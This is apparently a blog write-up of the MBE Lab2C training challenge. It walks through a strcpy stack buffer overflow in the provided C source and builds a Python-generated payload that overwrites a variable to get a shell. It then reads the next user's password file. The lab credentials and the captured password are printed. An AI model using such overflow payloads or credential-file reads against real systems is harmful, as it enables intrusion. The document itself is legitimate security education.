---
title: "Разбор Lab2C (легко)"
permalink: /writeups/mbe/lab2c/
excerpt: "Разбор Lab2C."
---

---
MBE's **Lab02** are mainly focused on Memory Corruption. The first level (*Lab2C*) is quite simple and a good introduction to basic stack overflow.

First, log into the Lab02 as **Lab2C** (`lab2C:lab02start`) and go to the challenges folder:

```shell
$ ssh lab2C@<VM_IP>
$ cd /levels/lab02/
```

Let's try to execute the program:

```shell
lab2C@warzone:/levels/lab02$ ./lab2C
usage:
./lab2C string
lab2C@warzone:/levels/lab02$ ./lab2C YOLO!
Not authenticated.
set_me was 0
lab2C@warzone:/levels/lab02$ 
```

The program takes an argument. However, it seems that we need to provide a specific input in order to be authenticated.

**Заметка:** From now on, we have access to the source code of all the remaining challenges. It means that we will be able to do static analysis on high-level codes in order to figure out where are the vulnerabilities.
{: .notice--info}

## Анализ исходного кода

Given we now have access to the source code, let's do a quick check of what it does:

```c
void shell()
{
   printf("You did it.\n");
   system("/bin/sh");
}

int main(int argc, char** argv)
{
   if(argc != 2)
   {
      printf("usage:\n%s string\n", argv[0]);
      return EXIT_FAILURE;
   }

   int set_me = 0;
   char buf[15];
   strcpy(buf, argv[1]);

   if(set_me == 0xdeadbeef)
   {
      shell();
   }
   else
   {
      printf("Not authenticated.\nset_me was %d\n", set_me);
   }

   return EXIT_SUCCESS;
}
```

This one is simple, if *set_me* variable is equal to **0xdeadbeef**, the *shell()* function is called and you get elevated privileges. The question now is how to put this value into *set_me*?

Here, the *strcpy()* function will copy our argument (**argv[1]**) in the **buf** char array. However, **buf** is only 15 bytes long. As *strcpy()* won't check the size of the source and target buffers, if our input, *argv[1]*, is too big, *buf* will **overflow** into *set_me*. 

So, with a large enough input, we can overwrite *set_me* with the value of our choice.

## Динамический анализ

Enough with the theory, let's check our assumptions. Here, we don't really need to use `gdb` as the exploit is fairly simple.

First, a quick proof of concept with an argument composed of **15** *A's* and **4** *B's*.

```shell
lab2C@warzone:/levels/lab02$ ./lab2C `python -c 'print 15 * "A" + "BBBB"'`
Not authenticated.
set_me was 1111638594
```

Interesting, now the *set_me* value is equal to **1111638594**, which is **0x42424242** in hexadecimal, or **BBBB** is ASCII. Now, we just need to change the second part of our proof of concept with the value **0xdeadbeef** in order to solve this challenge.

## Решение

Let's modify our payload and solve this challenge.

```shell
lab2C@warzone:/levels/lab02$ ./lab2C `python -c 'print 15 * "A" + "\xef\xbe\xad\xde"'`
You did it.
$ whoami
lab2B
$ cat /home/lab2B/.pass
1m_all_ab0ut_d4t_b33f
```

Easy, right ? Let's go to the next [challenge](/writeups/mbe/lab2b/)!
